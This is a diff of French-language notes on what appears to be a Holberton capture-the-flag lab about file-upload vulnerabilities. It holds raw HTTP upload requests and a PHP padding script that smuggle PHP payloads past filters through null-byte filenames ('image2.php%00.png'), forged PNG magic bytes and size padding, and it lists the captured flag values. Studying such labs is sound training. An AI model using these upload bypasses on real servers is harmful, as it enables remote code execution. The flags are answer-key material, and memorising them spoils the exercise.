@@ -69,3 +69,125 @@ Au bout de la ligne -> copy link:
 
 http://test-s3.web0x05.hbtn/static/upload/image.php
 36aac3b2c46dc71ff020b4f5a085a966
+
+Task2:
+
+POST /api/task2/ HTTP/1.1
+
+Host: test-s3.web0x05.hbtn
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://test-s3.web0x05.hbtn/task2
+
+Content-Type: multipart/form-data; boundary=---------------------------270755423135908614501606672748
+
+Content-Length: 259
+
+Origin: http://test-s3.web0x05.hbtn
+
+Connection: close
+
+
+
+-----------------------------270755423135908614501606672748
+
+Content-Disposition: form-data; name="file"; filename="image2.php%00.png"
+
+Content-Type: image/png
+
+
+
+<?php readfile('FLAG_2.txt') ?>
+
+-----------------------------270755423135908614501606672748--
+
+HTTP/1.1 200 OK
+
+Server: nginx/1.22.1
+
+Date: Mon, 22 Apr 2024 16:41:01 GMT
+
+Content-Type: application/json
+
+Content-Length: 65
+
+Connection: close
+
+
+
+{"message":"'/static/upload/image2.php' uploaded successfully."}
+
+http://test-s3.web0x05.hbtn/static/upload/image2.php
+2260137e83f142c4d2f75f049edfa6ce
+
+Task3:
+
+cat image3.php.png
+12345678
+<?php readfile('FLAG_3.txt') ?>
+
+┌──(kali㉿kali)-[~/Holberton/Upload Vulnerabilities]
+└─$ hexeditor image3.php
+
+Modifier le nombre magique, c'est à dire les 8 premiers bit:
+89 50 4E 47 0D 0A 1A 0A
+
+
+-----------------------------151149216033677911173055865151
+
+Content-Disposition: form-data; name="file"; filename="image3.php%00.png"
+
+Content-Type: image/png
+
+
+PNG
+
+<?php readfile('FLAG_3.txt') ?>
+
+
+
+-----------------------------151149216033677911173055865151--
+http://test-s3.web0x05.hbtn/static/upload/image3.php
+8b73b0afdd57fbd2d44dc384babd03a7
+
+
+Task4:
+Créer un fichier upload_file_size.php
+<?php
+// Contenu du fichier
+$content = "12345678<?php readfile('FLAG_4.txt') ?>";
+
+// Taille cible
+$targetSize = 85000;
+
+// Calculer la taille actuelle du contenu
+$currentSize = strlen($content);
+
+// Si la taille actuelle est inférieure à la taille cible
+if ($currentSize < $targetSize) {
+    // Ajouter des octets de remplissage jusqu'à atteindre la taille cible
+    $fillSize = $targetSize - $currentSize;
+    $fillContent = str_repeat(' ', $fillSize); // Remplissage avec des espaces
+
+    // Écrire le contenu rempli dans le fichier
+    file_put_contents('image4.php%00.png', $content . $fillContent);
+} else {
+    // Si la taille actuelle est déjà supérieure ou égale à la taille cible, ne rien faire
+}
+?>
+
+┌──(kali㉿kali)-[~/Holberton/Upload Vulnerabilities]
+└─$ hexeditor image4.php%00.png
+
+Modifier le nombre magique, c'est à dire les 8 premiers bit:
+89 50 4E 47 0D 0A 1A 0A
+
+http://test-s3.web0x05.hbtn/static/upload/image4.php
+f1876ef678bd37ef53666b3c764528db
